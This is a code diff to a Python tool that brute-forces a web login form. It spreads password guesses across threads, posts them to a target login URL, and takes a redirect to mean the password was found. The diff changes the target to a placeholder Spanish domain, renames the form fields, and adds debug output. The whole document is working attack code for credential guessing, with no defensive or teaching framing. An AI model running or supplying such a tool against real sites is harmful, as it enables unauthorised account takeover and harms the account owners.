@@ -21,12 +21,12 @@ import os
 ################################################################################
 number_of_threads = 4
 # target login
-target_login = "http://www.site.com/login"
+target_login = "https://target.es/login"
 # target username and password input
-login_html = "login"
+login_html = "username"
 password_html = "password"
 # user to try passwords on
-login = "root"
+login = "username"
 # list of passwords, be imaginative
 passwords = ["this","is","a","list","of","passwords"]
 ################################################################################
@@ -68,20 +68,25 @@ def test_passwords_thread():
 			password_iterator += 1
 		except:
 			return
-		lock.release()
-		print(thread_data.thread_name,"-> trying",login,";",thread_data.password)
 		# sets the form data
 		thread_data.form = {login_html:login,
 							password_html:thread_data.password}
 		# makes the post
 		thread_data.response = thread_data.bot.post(url = target_login, data = thread_data.form)
-	
 		# decoment this if you want to know more info
-		# print("\tstatus_code      -->", response.status_code)
-		# print("\tresponse.history -->", response.history)
-		# print("\tredirected to    -->",response.url)
-	
+		print(thread_data.thread_name,"-> trying",login,";",thread_data.password)
+		# print("\tstatus_code      -->", thread_data.response.status_code)
+		# print("\tresponse.history -->", thread_data.response.history)
+		# print("\tis redirect      -->", thread_data.response.is_redirect)
+		# print("\tis p redirect    -->", thread_data.response.is_permanent_redirect)
+		# print("\tnext             -->", thread_data.response.next)
+		# print("\tredirected to    -->",thread_data.response.url)
+		# print("\theaders          -->", thread_data.response.headers)
+		# print("\ttext          -->", thread_data.response.text)
+		lock.release()
+		
 		# if the seession is redirected, we got the good password
+		# you can always parse the content of the response if this does not works
 		if thread_data.response.url != target_login:
 			print("\n")
 			print(thread_data.thread_name,"-> correct password is:", thread_data.password)
